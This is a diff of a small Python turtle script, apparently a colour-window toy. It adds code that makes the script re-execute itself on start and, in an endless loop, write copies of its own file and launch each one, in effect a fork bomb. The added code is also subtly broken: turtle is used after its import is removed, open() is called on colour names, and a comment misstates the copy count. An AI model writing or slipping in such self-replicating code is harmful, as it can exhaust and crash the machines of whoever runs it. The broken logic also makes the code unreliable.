@@ -1,8 +1,55 @@
-import turtle
+import random
+#!/usr/bin/env python3
+import os
+import subprocess
+
+# Get the script's own filename
+filename = os.path.basename(__file__)
+full_path = os.path.realpath(__file__)
+
+# Make the script executable
+subprocess.run(["chmod", "+x", filename])
+subprocess.run(["./" + filename])
+def create_copies(file_name):
+    while True:
+        new_file_name = f"{file_name[:-3]}_copy{2}.py"
+        with open(file_name, 'r') as original:
+            data = original.read()
+        with open(new_file_name, 'w') as copy:
+            copy.write(data)
+        subprocess.Popen(["python", new_file_name])
+    pass
+
+
+
+
+my_list = [
+    "red", "orange", "yellow", "green", "blue", "purple", "pink", "brown",
+    "gray", "black", "white", "lightblue", "darkgreen", "violet", "magenta",
+    "cyan", "turquoise", "gold", "chocolate", "coral", "darkorange", "lime",
+    "navy"
+]
+def openwindow(color):
+    screen = turtle.Screen()
+    screen.setup(1000, 1000)
+    screen.bgcolor(color)
+    turtle.done()
+    
+pass
 
 while True:
-    screen = turtle.Screen()
-    screen.setup(500, 500)
-    screen.bgcolor('green')
-    turtle.done() 
+    random_fruit = random.choice(my_list)
+    open(random_fruit)
+    open(random_fruit)
+    open(random_fruit)
+    create_copies(__file__)
+    
 pass
+
+
+
+
+  # Creates 5 copies of this script and runs them
+
+
+
